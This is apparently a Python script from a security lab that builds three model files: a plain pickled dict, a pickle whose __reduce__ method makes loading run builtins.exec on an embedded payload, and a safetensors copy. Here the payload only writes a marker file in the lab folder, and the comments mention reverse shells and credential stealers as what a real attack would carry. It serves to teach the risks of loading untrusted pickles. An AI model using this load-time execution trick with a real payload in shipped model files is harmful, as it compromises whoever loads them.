"""
make_models.py: build the three model files this lab uses, into ./models/.

  benign_model.pkl    a normal pickled "model" (a dict of weights). Loading it just returns the dict.
  evil_model.pkl      the SAME on the outside, but it carries a function call that runs when unpickled.
  model.safetensors   the same weights in the safetensors format, whose loading cannot run code.

SAFETY. The "evil" model is a lab placeholder, not malware. When loaded, its only effect is to write
one clearly-labelled marker file, models/../state/PWNED_BY_LAB_MODEL.txt, inside this lab folder. It
makes no network connection and touches nothing outside this folder. The path is an ABSOLUTE path,
baked in at build time, so the file is tied to this machine and this directory and is not portable
"malware" you could carry elsewhere. Rebuild it any time with `make models`.

Only run this in the lab. Only ever load a pickle you built or fully trust (lesson 0.8).
"""

import builtins
import os
import pickle

import numpy as np
from safetensors.numpy import save_file

HERE = os.path.dirname(os.path.abspath(__file__))
MODELS = os.path.join(HERE, "models")
STATE = os.path.join(HERE, "state")
MARKER = os.path.join(STATE, "PWNED_BY_LAB_MODEL.txt")

# Stand-in "weights" so the files contain something model-shaped.
WEIGHTS = {
    "layer.weight": np.array([0.10, 0.20, 0.30], dtype=np.float32),
    "layer.bias": np.array([0.00], dtype=np.float32),
}

# The lab payload. A real attack would put a reverse shell or a credential stealer here
# (see lesson 9.2: the 2024-2025 Hugging Face models opened reverse shells). Ours only writes a
# marker file, so you can SEE that loading the model ran code, with zero risk.
_PAYLOAD = (
    "import os;"
    f"os.makedirs(r'{STATE}', exist_ok=True);"
    f"open(r'{MARKER}', 'w').write("
    "'LAB MARKER: loading this pickle executed code. This is a harmless lab placeholder, "
    "not real malware. Delete me with: make clean')"
)


class EvilModel:
    """Looks like a model object. pickle calls __reduce__ when SAVING it; the call it returns runs on load."""

    def __reduce__(self):
        # pickle will call builtins.exec(_PAYLOAD) while unpickling. That is the whole trick:
        # the pickle format is allowed to say "call this function with these arguments".
        return (builtins.exec, (_PAYLOAD,))


def main() -> None:
    os.makedirs(MODELS, exist_ok=True)

    with open(os.path.join(MODELS, "benign_model.pkl"), "wb") as f:
        # A plain dict of weights: exactly what a careless project ships as a .pkl/.bin.
        pickle.dump({k: v.tolist() for k, v in WEIGHTS.items()}, f)

    with open(os.path.join(MODELS, "evil_model.pkl"), "wb") as f:
        pickle.dump(EvilModel(), f)

    save_file(WEIGHTS, os.path.join(MODELS, "model.safetensors"))

    print("Built in ./models/ :")
    for name in ("benign_model.pkl", "evil_model.pkl", "model.safetensors"):
        p = os.path.join(MODELS, name)
        print(f"  {name:20s} {os.path.getsize(p):>6d} bytes")
    print("\nThe two .pkl files hold the 'same' model. One of them runs code when you load it.")


if __name__ == "__main__":
    main()
